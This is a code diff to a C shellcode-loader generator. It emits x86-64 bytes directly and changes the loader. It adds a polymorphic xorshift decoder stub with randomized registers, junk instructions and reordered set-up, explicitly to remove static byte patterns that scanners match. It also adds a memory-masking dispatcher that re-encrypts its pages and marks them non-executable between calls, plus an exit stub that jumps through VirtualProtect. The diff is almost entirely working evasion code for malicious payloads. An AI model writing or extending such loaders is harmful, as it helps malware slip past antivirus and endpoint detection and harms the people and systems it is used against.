+    *p++ = 0xB8 | (K & 7); memcpy(p, &seed, 4); p += 4;                   // mov K, seed
+    d = (int32_t)(xloop - (p + 5));
+    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call xloop
+    JK;
+    p = mk_rip(p, pg, 1, 0x8B, P, SLOT(FRITTER_MASK_IBASE), 0);           // mov P, [ibase]
+    p = mk_rip(p, pg, 0, 0x8B, C, SLOT(FRITTER_MASK_ICNT), 0);            // mov C, [icnt]
+    p = mk_r32(p, 0x85, C, C);                                            // test C, C
+    *p++ = 0x74; je = p++;                                                // jz done
+    if(K >> 3) *p++ = 0x41;
+    *p++ = 0xB8 | (K & 7); memcpy(p, &seed2, 4); p += 4;                  // mov K, seed2
+    d = (int32_t)(xloop - (p + 5));
+    *p++ = 0xE9; memcpy(p, &d, 4); p += 4;                                // jmp xloop
+    *je = (uint8_t)(p - (je + 1));
+    *p++ = 0xC3;                                                          // done: ret
+    p += RB & 0x1F;
+
+    /* unmask: everything back to RWX, then decrypt */
+    unmask = p;
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;                   // sub rsp, 0x28
+    p = mk_vp(p, pg, 2, RB);
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;                   // add rsp, 0x28
+    JK;
+    p = mk_rip(p, pg, 0, 0xC7, 0, SLOT(FRITTER_MASK_FLAG), 4);            // mov dword [flag], 0
+    memset(p, 0, 4); p += 4;
+    d = (int32_t)(crypt - (p + 5));
+    *p++ = 0xE9; memcpy(p, &d, 4); p += 4;                                // jmp crypt
+    p += RB & 0x1F;
+
+    /* where the forwarded call returns to */
+    back = p;
+    *p++ = 0x50;                                                          // push rax
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;
+    d = (int32_t)(unmask - (p + 5));
+    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call unmask
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;
+    *p++ = 0x58;                                                          // pop rax
+    JK;
+    STK_POP_R10R11;
+    *p++ = 0x43; *p++ = 0xFF; *p++ = 0x24; *p++ = 0xDA;                   // jmp [r10+r11*8]
+    p += RB & 0x1F;
+
+    /* where an inbound call returns to: mask again, go back to the caller */
+    inback = p;
+    *p++ = 0x50;                                                          // push rax
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;
+    STK_POP_R10R11;
+    *p++ = 0x4B; *p++ = 0x8B; *p++ = 0x04; *p++ = 0xDA;                   // mov rax, [r10+r11*8]
+    p = mk_rip(p, pg, 1, 0x89, 0, SLOT(FRITTER_MASK_IRET), 0);            // mov [iret], rax
+    JK;
+    d = (int32_t)(crypt - (p + 5));
+    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call crypt
+    p = mk_rip(p, pg, 0, 0xC7, 0, SLOT(FRITTER_MASK_FLAG), 4);            // mov dword [flag], nonzero
+    *p++ = RB | 1; *p++ = RB; *p++ = RB; *p++ = RB;
+    p = mk_vp(p, pg, 0, RB);
+    JK;
+    p = mk_vp(p, pg, 1, RB);
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;
+    *p++ = 0x58;                                                          // pop rax
+    p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_IRET), 0);            // jmp [iret]
+    p += RB & 0x1F;
+
+    /* inbound: rax = tbase + 8 * thunk number */
+    tbase = ((uint32_t)RB << 12) | ((uint32_t)RB << 4) | (RB & 0xF);
+    incommon = p;
+    p = mk_rip(p, pg, 0, 0x83, 7, SLOT(FRITTER_MASK_FLAG), 1);            // cmp dword [flag], 0
+    *p++ = 0;
+    *p++ = 0x74; je = p++;                                                // je forward (not masked)
+    *p++ = 0x51; *p++ = 0x52; *p++ = 0x41; *p++ = 0x50;                   // push rcx, rdx, r8,
+    *p++ = 0x41; *p++ = 0x51; *p++ = 0x50;                                //      r9, rax
+    d = (int32_t)(unmask - (p + 5));
+    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call unmask
+    *p++ = 0x58; *p++ = 0x41; *p++ = 0x59; *p++ = 0x41; *p++ = 0x58;      // pop rax, r9, r8,
+    *p++ = 0x5A; *p++ = 0x59;                                             //     rdx, rcx
+    JK;
+    p = mk_rip(p, pg, 1, 0x8B, 10, SLOT(FRITTER_MASK_SP), 0);             // mov r10, [sp]
+    *p++ = 0x49; *p++ = 0xC1; *p++ = 0xE2; *p++ = 0x03;                   // shl r10, 3
+    p = mk_rip(p, pg, 1, 0x8D, 11, SLOT(FRITTER_MASK_STK), 0);            // lea r11, [stk]
+    *p++ = 0x4D; *p++ = 0x01; *p++ = 0xDA;                                // add r10, r11
+    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x1C; *p++ = 0x24;                   // mov r11, [rsp]
+    *p++ = 0x4D; *p++ = 0x89; *p++ = 0x1A;                                // mov [r10], r11
+    p = mk_rip(p, pg, 1, 0xFF, 0, SLOT(FRITTER_MASK_SP), 0);              // inc qword [sp]
+    p = mk_rip(p, pg, 1, 0x8D, 11, (int32_t)(inback - pg), 0);            // lea r11, [inback]
+    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x1C; *p++ = 0x24;                   // mov [rsp], r11
+    *je = (uint8_t)(p - (je + 1));
+    p = mk_rip(p, pg, 1, 0x8D, 11, SLOT(FRITTER_MASK_TGT) - (int32_t)tbase, 0);   // forward: lea r11, [targets - tbase]
+    *p++ = 0x41; *p++ = 0xFF; *p++ = 0x24; *p++ = 0x03;                   // jmp [r11+rax]
+    p += RB & 0x1F;
+    {
+      /* the thunks: mov eax, tbase + 8k / jmp incommon / filler */
+      uint16_t stride = (uint16_t)(10 + (RB & 3));
+      uint32_t k, v;
+      off = (uint16_t)(p - pg);
+      memcpy(pg + 4, &off, 2);
+      memcpy(pg + 6, &stride, 2);
+      for(k = 0; k < FRITTER_MASK_NTGT; k++, p += stride) {
+        if((p - pg) + stride > (int)MASK_PAGE) return 0;
+        v = tbase + 8 * k;
+        p[0] = 0xB8; memcpy(p + 1, &v, 4);
+        d = (int32_t)(incommon - (p + 10));
+        p[5] = 0xE9; memcpy(p + 6, &d, 4);
+      }
+    }
+    p += RB & 0x1F;
+
+    first = RB & 1;
+    for(blk = 0; blk < 2; blk++) {
+      off = (uint16_t)(p - pg);
+      if(blk == first) {
+        /* call entry */
+        memcpy(pg, &off, 2);
+        JK;
+        for(i = 3; i > 0; i--) { j = RB % (i + 1); t = ar[i]; ar[i] = ar[j]; ar[j] = t; }
+        for(i = 0; i < 4; i++) p = mk_rip(p, pg, 1, 0x89, ar[i], ARGSLOT(ar[i]), 0);   // save arguments
+        *p++ = 0x48; *p++ = 0x8B; *p++ = 0x04; *p++ = 0x24;               // mov rax, [rsp]
+        STK_PUSH_RAX;
+        p = mk_rip(p, pg, 1, 0x8D, 0, (int32_t)(back - pg), 0);           // lea rax, [back]
+        *p++ = 0x48; *p++ = 0x89; *p++ = 0x04; *p++ = 0x24;               // mov [rsp], rax
+        JK;
+        d = (int32_t)(crypt - (p + 5));
+        *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                            // call crypt
+        p = mk_rip(p, pg, 0, 0xC7, 0, SLOT(FRITTER_MASK_FLAG), 4);        // mov dword [flag], nonzero
+        *p++ = RB | 1; *p++ = RB; *p++ = RB; *p++ = RB;
+        *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;
+        p = mk_vp(p, pg, 0, RB);
+        JK;
+        p = mk_vp(p, pg, 1, RB);
+        *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;
+        for(i = 3; i > 0; i--) { j = RB % (i + 1); t = ar[i]; ar[i] = ar[j]; ar[j] = t; }
+        for(i = 0; i < 4; i++) p = mk_rip(p, pg, 1, 0x8B, ar[i], ARGSLOT(ar[i]), 0);   // restore arguments
+        JK;
+        p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_TARGET), 0);      // jmp [target]
+      } else {
+        /* exit entry */
+        memcpy(pg + 2, &off, 2);
+        JK;
+        {
+          static const uint8_t tr[5] = {0, 2, 8, 10, 11};                 // rcx holds the exit code
+          uint8_t R = tr[RB % 5], w = 0x48 | ((R >> 3) << 2);
+          if(RB & 1) {
+            *p++ = 0x65; *p++ = w; *p++ = 0x8B; *p++ = 0x04 | ((R & 7) << 3); *p++ = 0x25;
+            *p++ = 0x48; *p++ = 0; *p++ = 0; *p++ = 0;                    // mov R, gs:[0x48] (thread id)
+          } else {
+            *p++ = 0x65; *p++ = w; *p++ = 0x8B; *p++ = 0x04 | ((R & 7) << 3); *p++ = 0x25;
+            *p++ = 0x30; *p++ = 0; *p++ = 0; *p++ = 0;                    // mov R, gs:[0x30] (TEB)
+            JK;
+            *p++ = 0x48 | ((R >> 3) << 2) | (R >> 3); *p++ = 0x8B;
+            *p++ = 0x40 | ((R & 7) << 3) | (R & 7); *p++ = 0x48;          // mov R, [R+0x48]
+          }
+          JK;
+          p = mk_rip(p, pg, 1, 0x3B, R, SLOT(FRITTER_MASK_TID), 0);       // cmp R, [tid]
+        }
+        *p++ = 0x75; jne = p++;                                           // jne other
+        p = mk_rip(p, pg, 0, 0x83, 7, SLOT(FRITTER_MASK_FLAG), 1);        // cmp dword [flag], 0
+        *p++ = 0;
+        *p++ = 0x74; je = p++;                                            // je go
+        JK;
+        *p++ = 0x51;                                                      // push rcx
+        JK;
+        *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x20;
+        d = (int32_t)(unmask - (p + 5));
+        *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                            // call unmask
+        *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x20;
+        *p++ = 0x59;                                                      // pop rcx
+        *je = (uint8_t)(p - (je + 1));
+        p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_HOOK), 0);        // go: jmp [hook]
+        *jne = (uint8_t)(p - (jne + 1));
+        p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_THREAD), 0);      // other: jmp [thread]
+      }
+      p += RB & 0x1F;
+    }
+    #undef RB
+    #undef JK
+    #undef SLOT
+    #undef ARGSLOT
+    #undef STK_PUSH_RAX
+    #undef STK_POP_R10R11
+    return (p - pg) <= (int)MASK_PAGE;
+}
+
+#define DISPATCHER_MAX_SIZE 640u
+
+/* Emit the exit stub: the last code of the shellcode to run. The RSP-align
+ * epilogue jumps here with the caller's stack already restored and
+ * rax = the shim's exit block {VirtualProtect, base, size, scratch} (or 0).
+ * It loads the arguments and JUMPS to VirtualProtect, which then returns
+ * straight to whoever started the shellcode, so no page of ours has to stay
+ * executable. Falls back to a plain RET when there is no block or the
+ * caller's stack is not ABI-aligned. Returns bytes written (< 96). */
+static uint32_t emit_exit_stub(uint8_t *out) {
+    uint8_t *p = out, rnd[8], order[5] = {0,1,2,3,4};
+    uint8_t *jz_at, *jne_at;
+    gen_random(rnd, sizeof(rnd));
+    uint8_t s1 = 2 + (rnd[0] & 1);        /* low3 of r10 / r11: alignment scratch */
+    uint8_t s2 = 2 + ((rnd[0] >> 1) & 1); /* low3 of r10 / r11: jump target */
+
+    #define XS_JUNK(i) do { if(rnd[i] & 1) p += emit_rnd_nop(p, 1 + ((rnd[i] >> 1) & 3)); } while(0)
+
+    *p++ = 0x48; *p++ = 0x85; *p++ = 0xC0;              /* test rax, rax */
+    *p++ = 0x74; jz_at = p++;                           /* jz ret */
+    XS_JUNK(1);
+    *p++ = 0x41; *p++ = 0x89; *p++ = 0xE0 | s1;         /* mov s1d, esp */
+    *p++ = 0x41; *p++ = 0x83; *p++ = 0xE0 | s1; *p++ = 0x0F; /* and s1d, 15 */
+    *p++ = 0x41; *p++ = 0x83; *p++ = 0xF8 | s1; *p++ = 0x08; /* cmp s1d, 8 */
+    *p++ = 0x75; jne_at = p++;                          /* jne ret */
+
+    for(int i = 4; i > 0; i--) {                        /* shuffle the five loads */
+      int j = rnd[2 + (i & 3)] % (i + 1);
+      uint8_t t = order[i]; order[i] = order[j]; order[j] = t;
+    }
+    for(int i = 0; i < 5; i++) {
+      switch(order[i]) {
+        case 0: *p++ = 0x48; *p++ = 0x8B; *p++ = 0x48; *p++ = 0x08; break;  /* mov rcx,[rax+8]  */
+        case 1: *p++ = 0x48; *p++ = 0x8B; *p++ = 0x50; *p++ = 0x10; break;  /* mov rdx,[rax+16] */
+        case 2: *p++ = 0x41; *p++ = 0xB8; *p++ = 0x04; *p++ = 0; *p++ = 0; *p++ = 0; break; /* mov r8d, PAGE_READWRITE */
+        case 3: *p++ = 0x4C; *p++ = 0x8D; *p++ = 0x48; *p++ = 0x18; break;  /* lea r9,[rax+24]  */
+        default:*p++ = 0x4C; *p++ = 0x8B; *p++ = (uint8_t)(s2 << 3); break; /* mov s2,[rax]     */
+      }
+      if(rnd[6] & (1u << i)) p += emit_rnd_nop(p, 1 + ((rnd[7] >> i) & 1));
+    }
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0x20; *p++ = 0x00; /* and qword [rax], 0 */
+    *p++ = 0x41; *p++ = 0xFF; *p++ = 0xE0 | s2;         /* jmp s2 */
+
+    *jz_at  = (uint8_t)(p - (jz_at + 1));
+    *jne_at = (uint8_t)(p - (jne_at + 1));
+    *p++ = 0xC3;                                        /* ret */
+    #undef XS_JUNK
+    return (uint32_t)(p - out);
+}
+
+/* Must match MAX_FN_COUNT in loader/dispatch_shim.c. */
+#define SHIM_MAX_FN_COUNT   16u
 
 /**
  * Function: build_loader
@@ -1841,8 +2647,11 @@ static int build_loader(PFRITTER_CONFIG c) {
     epi_buf[epi_n++] = 0x58 | rsp_reg3;
     RSP_JUNK(epi_buf, epi_n);
 
-    // ret
-    epi_buf[epi_n++] = 0xC3;
+    // jmp rel32 to the exit stub inside the encoded region (patched once
+    // its position is known); the stub ends the run.
+    epi_buf[epi_n++] = 0xE9;
+    uint32_t epi_jmp_off = epi_n;
+    epi_n += 4;
 
     // Now emit prologue into rsp_buf
     // push reg
@@ -1863,15 +2672,23 @@ static int build_loader(PFRITTER_CONFIG c) {
     }
     RSP_JUNK(rsp_buf, rsp_n);
 
-    // and rsp,-0x10
-    rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
-    rsp_buf[rsp_n++] = 0xE4; rsp_buf[rsp_n++] = 0xF0;
-    RSP_JUNK(rsp_buf, rsp_n);
+    // and rsp,-0x10 / -0x20 / -0x40 (the epilogue restores rsp from the
+    // register, so any alignment >= 16 and any frame size will do)
+    {
+      static const uint8_t al[3] = {0xF0, 0xE0, 0xC0};
+      uint8_t fr[2];
+      gen_random(fr, 2);
+      rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
+      rsp_buf[rsp_n++] = 0xE4; rsp_buf[rsp_n++] = al[fr[0] % 3];
+      RSP_JUNK(rsp_buf, rsp_n);
 
-    // sub rsp,0x20
-    rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
-    rsp_buf[rsp_n++] = 0xEC; rsp_buf[rsp_n++] = 0x20;
-    RSP_JUNK(rsp_buf, rsp_n);
+      // sub rsp,N  OR  add rsp,-N   (N = 0x20..0x70, multiple of 16)
+      uint8_t frame = (uint8_t)(0x20 + 0x10 * ((fr[1] >> 1) % 6));
+      rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
+      if(fr[1] & 1) { rsp_buf[rsp_n++] = 0xEC; rsp_buf[rsp_n++] = frame; }
+      else          { rsp_buf[rsp_n++] = 0xC4; rsp_buf[rsp_n++] = (uint8_t)(0x100 - frame); }
+      RSP_JUNK(rsp_buf, rsp_n);
+    }
 
     // CALL rel32, disp = epilogue size (skips over epilogue to fall into decoder)
     rsp_buf[rsp_n++] = 0xE8;
@@ -1883,6 +2700,7 @@ static int build_loader(PFRITTER_CONFIG c) {
 
     // Append epilogue
     memcpy(rsp_buf + rsp_n, epi_buf, epi_n);
+    uint32_t rsp_exit_disp_off = rsp_n + epi_jmp_off;
     rsp_n += epi_n;
 
     unsigned char *rsp_align      = rsp_buf;
@@ -1900,7 +2718,9 @@ static int build_loader(PFRITTER_CONFIG c) {
     // Replaces the static `48 8D 15 ?? ?? ?? ?? E9 ?? ?? ?? ??` pattern.
     // LEA disp and (if used) JMP disp are patched after page_pad is known.
 
-    static const uint8_t TRAMP_LEA_REGS[] = { 3, 2, 6, 7, 8 }; // RBX,RDX,RSI,RDI,R8
+    // Volatile registers only: this code runs before anything saves the
+    // caller's non-volatile registers, and RCX holds the instance pointer.
+    static const uint8_t TRAMP_LEA_REGS[] = { 0, 2, 8, 9, 10, 11 }; // RAX,RDX,R8-R11
     static uint8_t tramp_buf[64];
     uint32_t tramp_n = 0;
     uint32_t tramp_lea_disp_off = 0;
@@ -1986,43 +2806,35 @@ static int build_loader(PFRITTER_CONFIG c) {
     //         [dec counter] [jnz loop] [junk]* [pop rcx] [8 key bytes]
     //         (fall through to decoded loader)
 
-    // --- Variable key length (4, 8, or 16 bytes) ---
-    // Drives AND-mask immediate, JMP-SHORT imm over key tail, trailing
-    // key byte count, AND host-side XOR encode mask. One pick collapses
-    // three previously-fixed anchors (`AND ?? 07`, `EB 08`, 8-byte tail).
-    uint8_t xor_key[16];
-    uint32_t key_len;
-    uint8_t  key_mask;
+    // --- Keystream ---
+    // The blob is XORed dword by dword with a 32-bit xorshift state. Seed
+    // and shift triple are drawn per output and compiled into the decoder
+    // as immediates: no key bytes follow the stub and no period shows in
+    // the encoded data. The whole state is used for every dword: with only
+    // its low byte, short windows of the stream are not unique and periodic
+    // plaintext showed through as repeated ciphertext.
+    fn_stream_t outer;
+    uint32_t    outer_seed;
     gen_random(&rnd_byte, 1);
-    switch(rnd_byte % 3) {
-      case 0:  key_len = 4;  key_mask = 0x03; break;
-      case 1:  key_len = 8;  key_mask = 0x07; break;
-      default: key_len = 16; key_mask = 0x0F; break;
-    }
-    gen_random(xor_key, key_len);
+    memcpy(outer.sh, XS_TRIPLES[rnd_byte % 36], 3);
+    outer.rev = 0;
+    do { if(!gen_random(&outer_seed, 4)) return FRITTER_ERROR_RANDOM; } while(outer_seed == 0);
 
-    // --- Zero-init opcode: XOR (0x31) or SUB (0x29) ---
-    // Same ModRM shape, same effect on the register; opcode flip alone.
+    // --- Where the pointer increment sits among the three state steps ---
     gen_random(&rnd_byte, 1);
-    uint8_t zero_opcode = (rnd_byte & 1) ? 0x29 : 0x31;
-
-    // --- Hot-loop ordering of {inc_dp, inc_idx, and_mask} ---
-    // 3 valid orderings (and_mask must follow inc_idx):
-    //   0: inc_dp, inc_idx, and_mask
-    //   1: inc_idx, inc_dp, and_mask
-    //   2: inc_idx, and_mask, inc_dp
-    gen_random(&rnd_byte, 1);
-    int loop_order = rnd_byte % 3;
+    int loop_order = rnd_byte & 3;
 
     // --- Register selection ---
-    // Roles: key_ptr, data_ptr, counter, key_idx
-    // RAX/AL is hardcoded for XOR byte transfer.
-    // RCX is pushed/popped (instance pointer). ECX reusable inside decoder.
-    // Avoid RSP(4), RBP(5) and R12-R15 (SIB complications).
-    // Pool: RBX(3), RCX(1), RDX(2), RSI(6), RDI(7), R8(0+REX)
+    // Roles: data_ptr, counter, state, temp.
+    // RCX is pushed/popped (instance pointer) and reusable inside.
+    // Volatile registers only (Win64): the decoder must not clobber the
+    // caller's RBX/RSI/RDI, which nothing on this path saves. None of the
+    // pool has low3 == 4 or 5, so no SIB/disp special cases arise, and the
+    // low byte of each is addressable (CL/DL without REX, R8B-R11B with).
+    // Pool: RCX(1), RDX(2), R8(0+REX), R9(1+REX), R10(2+REX), R11(3+REX)
     typedef struct { uint8_t reg3; uint8_t rex; } DREG;
     static const DREG dreg_pool[] = {
-      {3,0}, {1,0}, {2,0}, {6,0}, {7,0}, {0,1} // rbx,rcx,rdx,rsi,rdi,r8
+      {1,0}, {2,0}, {0,1}, {1,1}, {2,1}, {3,1} // rcx,rdx,r8,r9,r10,r11
     };
     #define DREG_POOL_SIZE 6
 
@@ -2033,10 +2845,10 @@ static int build_loader(PFRITTER_CONFIG c) {
       int j = rnd_byte % (i+1);
       int tmp = didx[i]; didx[i] = didx[j]; didx[j] = tmp;
     }
-    DREG rKP  = dreg_pool[didx[0]]; // key pointer
-    DREG rDP  = dreg_pool[didx[1]]; // data pointer
-    DREG rCNT = dreg_pool[didx[2]]; // loop counter
-    DREG rIDX = dreg_pool[didx[3]]; // key index (0-7)
+    DREG rDP  = dreg_pool[didx[0]]; // data pointer
+    DREG rCNT = dreg_pool[didx[1]]; // loop counter
+    DREG rK   = dreg_pool[didx[2]]; // keystream state
+    DREG rTs[3] = { dreg_pool[didx[3]], dreg_pool[didx[4]], dreg_pool[didx[5]] }; // a temp per step
 
     // djunk[] / DJUNK_COUNT defined at top of function - shared with RSP-align gen
 
@@ -2053,7 +2865,6 @@ static int build_loader(PFRITTER_CONFIG c) {
     } while(0)
 
     // Fixup tracking for RIP-relative displacements and JNZ
-    #define FIXUP_KEY   0  // LEA key_ptr -> key data at end of stub
     #define FIXUP_DATA  1  // LEA data_ptr -> encoded loader (past end of stub)
     #define FIXUP_JNZ   2  // JNZ -> loop start
     #define MAX_FIXUPS  3
@@ -2074,111 +2885,97 @@ static int build_loader(PFRITTER_CONFIG c) {
     db[ds++] = 0x51;
     EMIT_JUNK();
 
-    // lea key_ptr, [rip+??] -> will point to key at end of stub
-    db[ds++] = 0x48 | (rKP.rex << 2); // REX.W + REX.R if R8
-    db[ds++] = 0x8D;
-    db[ds++] = 0x05 | (rKP.reg3 << 3); // ModRM: mod=00, reg=key_ptr, rm=101(RIP)
-    fixup_offset[FIXUP_KEY] = ds;
-
-    ds += 4; // placeholder disp32
-    fixup_end[FIXUP_KEY] = ds;
-    EMIT_JUNK();
-
-    // lea data_ptr, [rip+??] -> will point to encoded loader
-    db[ds++] = 0x48 | (rDP.rex << 2);
-    db[ds++] = 0x8D;
-    db[ds++] = 0x05 | (rDP.reg3 << 3);
-    fixup_offset[FIXUP_DATA] = ds;
-
-    ds += 4;
-    fixup_end[FIXUP_DATA] = ds;
-    EMIT_JUNK();
-
-    // mov counter_32, loader_size (will be re-patched to combined_size later)
-    if(rCNT.rex) db[ds++] = 0x41; // REX.B for R8
-    db[ds++] = 0xB8 + rCNT.reg3;
-    int counter_imm_offset = ds; // track offset of the 4-byte immediate
-    memcpy(db + ds, &loader_size, 4);
-    ds += 4;
-    EMIT_JUNK();
-
-    // zero key_idx_32 - XOR (0x31) or SUB (0x29), randomized per output
-    if(rIDX.rex) db[ds++] = 0x45; // REX.RB (same reg in both fields)
-    db[ds++] = zero_opcode;
-    db[ds++] = 0xC0 | (rIDX.reg3 << 3) | rIDX.reg3;
-    EMIT_JUNK();
+    // The three set-ups are independent: emit them in a random order.
+    gen_random(&rnd_byte, 1);
+    int counter_imm_offset = 0, setup_first = rnd_byte % 3;   // EMIT_JUNK reuses rnd_byte
+    for(int su = 0; su < 3; su++) {
+      switch((su + setup_first) % 3) {
+        case 0:
+          // lea data_ptr, [rip+??] -> will point to encoded loader
+          db[ds++] = 0x48 | (rDP.rex << 2);
+          db[ds++] = 0x8D;
+          db[ds++] = 0x05 | (rDP.reg3 << 3);
+          fixup_offset[FIXUP_DATA] = ds;
+          ds += 4;
+          fixup_end[FIXUP_DATA] = ds;
+          break;
+        case 1:
+          // mov counter_32, loader_size (re-patched to combined_size later)
+          if(rCNT.rex) db[ds++] = 0x41;
+          db[ds++] = 0xB8 + rCNT.reg3;
+          counter_imm_offset = ds; // track offset of the 4-byte immediate
+          memcpy(db + ds, &loader_size, 4);
+          ds += 4;
+          break;
+        default:
+          // mov state_32, seed
+          if(rK.rex) db[ds++] = 0x41;
+          db[ds++] = 0xB8 + rK.reg3;
+          memcpy(db + ds, &outer_seed, 4);
+          ds += 4;
+          break;
+      }
+      EMIT_JUNK();
+    }
 
     // === decode_loop: ===
     loop_start = ds;
 
-    // mov al, [key_ptr + key_idx]   (SIB addressing)
+    // xor [data_ptr], state_32
     {
-      uint8_t rex = 0;
-      if(rKP.rex || rIDX.rex) rex = 0x40 | rKP.rex | (rIDX.rex << 1);
-      if(rex) db[ds++] = rex;
-      db[ds++] = 0x8A; // MOV r8, r/m8
-      db[ds++] = 0x04; // ModRM: mod=00, reg=AL(0), rm=100(SIB)
-      db[ds++] = (rIDX.reg3 << 3) | rKP.reg3; // SIB: scale=0, index=key_idx, base=key_ptr
+      uint8_t rex = (uint8_t)((rK.rex << 2) | rDP.rex);
+      if(rex) db[ds++] = 0x40 | rex;
+      db[ds++] = 0x31; // XOR r/m32, r32
+      db[ds++] = (rK.reg3 << 3) | rDP.reg3; // ModRM: mod=00, reg=state, rm=data_ptr
     }
     EMIT_JUNK();
 
-    // xor [data_ptr], al
-    {
-      uint8_t rex = 0;
-      if(rDP.rex) rex = 0x40 | rDP.rex;
-      if(rex) db[ds++] = rex;
-      db[ds++] = 0x30; // XOR r/m8, r8
-      db[ds++] = rDP.reg3; // ModRM: mod=00, reg=AL(0), rm=data_ptr
-    }
-    EMIT_JUNK();
-
-    // --- Reorderable middle: {inc_dp, inc_idx, and_mask} ---
-    // Local emitters; called in `loop_order`-selected sequence.
+    // add data_ptr, 4  OR  lea data_ptr, [data_ptr+4]
     #define EMIT_INC_DP() do { \
-      db[ds++] = 0x48 | rDP.rex; \
-      db[ds++] = 0xFF; \
-      db[ds++] = 0xC0 | rDP.reg3; \
+      gen_random(&rnd_byte, 1); \
+      if(rnd_byte & 1) { \
+        db[ds++] = 0x48 | rDP.rex; db[ds++] = 0x83; \
+        db[ds++] = 0xC0 | rDP.reg3; db[ds++] = 4; \
+      } else { \
+        db[ds++] = 0x48 | (rDP.rex << 2) | rDP.rex; db[ds++] = 0x8D; \
+        db[ds++] = 0x40 | (rDP.reg3 << 3) | rDP.reg3; db[ds++] = 4; \
+      } \
     } while(0)
 
-    #define EMIT_INC_IDX() do { \
-      uint8_t _rex = 0; \
-      if(rIDX.rex) _rex = 0x41; \
-      else if(rIDX.reg3 >= 4) _rex = 0x40; \
-      if(_rex) db[ds++] = _rex; \
-      db[ds++] = 0xFE; \
-      db[ds++] = 0xC0 | rIDX.reg3; \
-    } while(0)
-
-    #define EMIT_AND_MASK() do { \
-      uint8_t _rex = 0; \
-      if(rIDX.rex) _rex = 0x41; \
-      else if(rIDX.reg3 >= 4) _rex = 0x40; \
-      if(_rex) db[ds++] = _rex; \
-      db[ds++] = 0x80; \
-      db[ds++] = 0xE0 | rIDX.reg3; \
-      db[ds++] = key_mask; \
-    } while(0)
-
-    switch(loop_order) {
-      case 0: // inc_dp, inc_idx, and_mask
-        EMIT_INC_DP();   EMIT_JUNK();
-        EMIT_INC_IDX();  EMIT_JUNK();
-        EMIT_AND_MASK();
-        break;
-      case 1: // inc_idx, inc_dp, and_mask
-        EMIT_INC_IDX();  EMIT_JUNK();
-        EMIT_INC_DP();   EMIT_JUNK();
-        EMIT_AND_MASK();
-        break;
-      default: // inc_idx, and_mask, inc_dp
-        EMIT_INC_IDX();  EMIT_JUNK();
-        EMIT_AND_MASK(); EMIT_JUNK();
-        EMIT_INC_DP();
-        break;
+    // state ^= state << a; state ^= state >> b; state ^= state << c
+    for(int st = 0; st < 3; st++) {
+      uint8_t rex, form;
+      DREG    rT = rTs[st];
+      if(loop_order == st) { EMIT_INC_DP(); EMIT_JUNK(); }
+      gen_random(&form, 1);
+      // mov temp, state (either encoding)
+      if(form & 1) {
+        rex = (uint8_t)((rK.rex << 2) | rT.rex);
+        if(rex) db[ds++] = 0x40 | rex;
+        db[ds++] = 0x89; db[ds++] = 0xC0 | (rK.reg3 << 3) | rT.reg3;
+      } else {
+        rex = (uint8_t)((rT.rex << 2) | rK.rex);
+        if(rex) db[ds++] = 0x40 | rex;
+        db[ds++] = 0x8B; db[ds++] = 0xC0 | (rT.reg3 << 3) | rK.reg3;
+      }
+      if(rT.rex) db[ds++] = 0x41;
+      db[ds++] = 0xC1; db[ds++] = ((st == 1) ? 0xE8 : 0xE0) | rT.reg3;   // shl/shr temp, n
+      db[ds++] = outer.sh[st];
+      // xor state, temp (either encoding)
+      if(form & 2) {
+        rex = (uint8_t)((rT.rex << 2) | rK.rex);
+        if(rex) db[ds++] = 0x40 | rex;
+        db[ds++] = 0x31; db[ds++] = 0xC0 | (rT.reg3 << 3) | rK.reg3;
+      } else {
+        rex = (uint8_t)((rK.rex << 2) | rT.rex);
+        if(rex) db[ds++] = 0x40 | rex;
+        db[ds++] = 0x33; db[ds++] = 0xC0 | (rK.reg3 << 3) | rT.reg3;
+      }
+      if(st < 2) EMIT_JUNK();
     }
-    // Trailing junk before DEC (DEC+JNZ must be flag-adjacent - no junk
-    // between them, but here is fine since DEC overwrites flags from any
-    // intervening instruction).
+    if(loop_order == 3) EMIT_INC_DP();
+    // Junk before DEC is fine: DEC overwrites the flags of anything before
+    // it. DEC+JNZ must stay adjacent.
     EMIT_JUNK();
 
     // dec counter_32 + jnz loop (atomic pair - JNZ reads flags from DEC)
@@ -2193,21 +2990,9 @@ static int build_loader(PFRITTER_CONFIG c) {
     fixup_end[FIXUP_JNZ] = ds;
     EMIT_JUNK();
 
-    // pop rcx (restore instance pointer)
+    // pop rcx (restore instance pointer), then fall into the trampoline
     db[ds++] = 0x59;
-    // Junk between POP and JMP-SHORT - breaks the `59 EB ??` 3-byte anchor
-    // by inserting 0..N pool bytes in the middle. JMP imm still skips
-    // exactly key_len bytes (junk lives BEFORE the EB).
     EMIT_JUNK();
-
-    // jmp short +key_len (skip over key data to reach decoded loader)
-    db[ds++] = 0xEB;
